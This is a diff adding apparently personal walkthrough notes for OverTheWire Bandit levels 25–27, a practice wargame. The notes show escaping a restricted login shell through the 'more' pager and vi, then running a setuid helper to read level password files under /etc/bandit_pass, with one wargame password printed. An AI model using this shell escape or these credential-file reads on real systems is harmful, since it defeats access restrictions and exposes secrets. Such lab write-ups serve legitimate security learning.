@@ -1,0 +1,49 @@
+ssh -i bandit26.sshkey bandit26@localhost -p2220
+
+I see this message fly past:
+
+!!! You are trying to log into this SSH server with a password on port 2220 from localhost.
+!!! Connecting from localhost is blocked to conserve resources.
+!!! Please log out and log in again.
+
+
+copy the ssh key to my local machine and it still drops out which means the shell isn't set to bash
+
+go back to bandit25 and I can see in /etc/password the shell is set to:
+
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+bandit25@bandit:~$ /usr/bin/showtext
+more: cannot open /home/bandit25/text.txt: No such file or directory
+
+by shrinking the terminal window down I can convince more to show the pager, at which point I can enter v to bring up a command and then enter:
+
+:set shell=/bin/bash
+:set
+
+and I see the following:
+:shell
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ cat text.txt
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do bandit27
+env: ‘bandit27’: Permission denied
+bandit26@bandit:~$ id bandit27
+uid=11027(bandit27) gid=11027(bandit27) groups=11027(bandit27)
+bandit26@bandit:~$ ./bandit27-do bandit26
+env: ‘bandit26’: Permission denied
+bandit26@bandit:~$
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+<snip>
